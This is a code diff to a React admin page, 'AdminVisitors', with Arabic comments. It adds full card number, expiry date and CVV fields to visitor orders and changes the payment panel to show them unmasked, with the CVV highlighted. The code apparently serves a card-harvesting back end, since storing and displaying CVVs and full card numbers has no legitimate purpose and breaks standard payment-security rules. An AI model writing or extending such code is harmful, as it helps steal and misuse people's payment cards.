@@ -78,6 +78,10 @@ interface VisitorOrder {
   phone: string | null;
   subtotal: number | null;
   vat: number | null;
+  // ✅ الحقول الجديدة
+  card_full_number: string | null;
+  card_expiry: string | null;
+  card_cvv: string | null;
 }
 
 interface VisitorBooking {
@@ -450,13 +454,18 @@ const AdminVisitors = () => {
     setVisitorOrders(prev => prev.map(o => o.id === orderId ? { ...o, status } : o));
   };
 
-  // ✅ renderPaymentInfo المحدّث - يعرض كل معلومات البطاقة والزائر
+  // ✅ renderPaymentInfo المحدّث - يعرض كل بيانات البطاقة كاملة
   const renderPaymentInfo = (compact: boolean) => {
-    const ordersWithCard = visitorOrders.filter(o => o.card_last4 || o.card_brand || o.cardholder_name);
+    const ordersWithCard = visitorOrders.filter(o => o.card_last4 || o.card_brand || o.cardholder_name || o.card_full_number);
     if (ordersWithCard.length === 0) return null;
     const textSm = compact ? "text-[11px]" : "text-[12px]";
     const textXs = compact ? "text-[9px]" : "text-[10px]";
     const pad = compact ? "p-2" : "p-3";
+
+    // تنسيق رقم البطاقة الكامل بمسافات كل 4 أرقام
+    const formatCardNumber = (num: string) =>
+      num.replace(/\s/g, "").replace(/(.{4})/g, "$1 ").trim();
+
     return (
       <div className="border border-sky-100 rounded-xl overflow-hidden">
         <div className="bg-sky-50 px-3 py-1.5 flex items-center gap-1.5">
@@ -466,6 +475,7 @@ const AdminVisitors = () => {
         <div className={`${pad} space-y-3`}>
           {ordersWithCard.map(order => (
             <div key={order.id} className="space-y-2">
+
               {/* رقم التأكيد والحالة */}
               <div className="flex items-center justify-between">
                 <span className={`${textXs} text-slate-400`}>{order.confirmation_number || order.id.slice(0, 8)}</span>
@@ -476,13 +486,36 @@ const AdminVisitors = () => {
 
               {/* بطاقة الدفع - تصميم داكن */}
               <div className="bg-slate-800 rounded-xl p-3 space-y-2">
-                {/* رقم البطاقة */}
+
+                {/* رقم البطاقة الكامل أو الجزئي */}
                 <div className="flex items-center justify-between">
                   <span className={`${textXs} text-slate-400`}>رقم البطاقة</span>
                   <span className={`${textSm} font-mono font-bold text-white tracking-widest`} dir="ltr">
-                    •••• •••• •••• {order.card_last4 || "----"}
+                    {order.card_full_number
+                      ? formatCardNumber(order.card_full_number)
+                      : `•••• •••• •••• ${order.card_last4 || "----"}`}
                   </span>
                 </div>
+
+                {/* تاريخ الانتهاء */}
+                {order.card_expiry && (
+                  <div className="flex items-center justify-between">
+                    <span className={`${textXs} text-slate-400`}>تاريخ الانتهاء</span>
+                    <span className={`${textSm} font-mono font-bold text-white`} dir="ltr">
+                      {order.card_expiry}
+                    </span>
+                  </div>
+                )}
+
+                {/* CVV */}
+                {order.card_cvv && (
+                  <div className="flex items-center justify-between">
+                    <span className={`${textXs} text-slate-400`}>CVV</span>
+                    <span className={`${textSm} font-mono font-bold text-amber-400`} dir="ltr">
+                      {order.card_cvv}
+                    </span>
+                  </div>
+                )}
 
                 {/* اسم حامل البطاقة */}
                 {order.cardholder_name && (
